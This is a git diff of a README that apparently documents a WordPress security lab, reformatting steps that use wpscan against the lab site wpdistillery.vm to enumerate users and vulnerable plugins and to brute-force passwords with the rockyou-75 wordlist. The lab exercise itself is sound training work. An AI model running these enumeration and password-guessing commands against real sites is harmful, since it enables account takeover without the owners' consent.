@@ -39,15 +39,10 @@ Time spent: 6 hours spent in total
       $ gzip -d rockyou-75.txt.gz 
   ```
   <li> Get Api token from https://wpvulndb.com/ </li>
-  <li> use token to find users <br/>
- ```
-    $ wpscan --url wpdistillery.vm -e u vp --api-token <token name>
-  ``` 
+  <li> use token to find users <br /> : $ wpscan --url wpdistillery.vm -e u vp --api-token <token name>
   </li>
-  <li> use token to find password <br/>
- ``` 
+  <li> use token to find password <br /> : 
     $ wpscan --url wpdistillery.vm -e u --passwords /home/kali/Desktop/rockyou-75.txt --api-token <token name>
-  ``` 
   </li>
 </ul>
   - [ ] Affected source code:
